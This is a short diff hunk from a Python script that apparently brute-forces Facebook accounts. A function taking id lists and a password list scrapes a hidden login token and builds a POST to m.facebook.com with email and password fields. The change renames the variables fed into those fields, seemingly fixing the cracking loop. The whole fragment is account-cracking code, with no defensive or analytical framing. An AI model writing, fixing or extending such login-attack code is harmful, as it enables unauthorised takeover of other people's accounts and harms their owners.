@@ -2039,8 +2039,8 @@ def __MTDSIX__(ids, names, passlist, total_ids):
    "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
    "try_number":"0",
    "unrecognized_tries":"0",
-   "email":idf,
-   "pass":ps,
+   "email":ids,
+   "pass":pas,
    "login":"Log In"}
             headers ={'authority':'m.facebook.com',
             'method': 'POST',
